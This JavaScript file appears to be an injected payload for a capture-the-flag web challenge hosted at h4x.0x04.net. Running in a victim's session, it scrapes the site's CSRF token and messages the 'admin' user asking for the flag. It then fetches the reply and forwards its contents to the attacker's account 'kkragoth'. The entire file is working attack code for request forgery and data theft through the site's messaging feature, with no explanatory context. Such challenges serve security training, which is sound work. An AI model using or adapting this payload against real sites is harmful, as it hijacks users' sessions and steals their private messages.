function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function get_csrf_token()
{
	var text = httpGet('https://h4x.0x04.net/send_message');

	var prefix = "'csrfmiddlewaretoken' value='"
	var pref_indx = text.indexOf(prefix)  + prefix.length;

	var new_text = text.slice(pref_indx)
	var csrfTOKENIK = new_text.slice(0, new_text.indexOf("'"));

	// console.log("TOKEN:" + csrfTOKENIK);

	return csrfTOKENIK;
}


function send_msg(who, msg) {
	 var http = new XMLHttpRequest();
	 http.open("POST", 'https://h4x.0x04.net/send_message', true);
	 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 http.onreadystatechange = function() {
	 		if (!http.responseText || 0 == http.responseText.length)
	 			return;

	 		var new_text = http.responseText.slice(http.responseText.indexOf('reply/'));
	 		new_text = new_text.slice(0, new_text.indexOf('">'));
	 		console.log(new_text);

	 		setTimeout(function(){ 
	 				var flaga = httpGet('https://h4x.0x04.net/'+ new_text);

			        var http1 = new XMLHttpRequest();
			 		http1.open("POST", 'https://h4x.0x04.net/send_message', true);
			 		http1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			 		http1.send("username=kkragoth&content="+flaga+"&csrfmiddlewaretoken=" + get_csrf_token());
	 		 }, 2000);

	 		

	 }
	 http.send("username="+who+"+&content="+msg+"&csrfmiddlewaretoken=" + get_csrf_token());
}

send_msg("admin", "dej flage");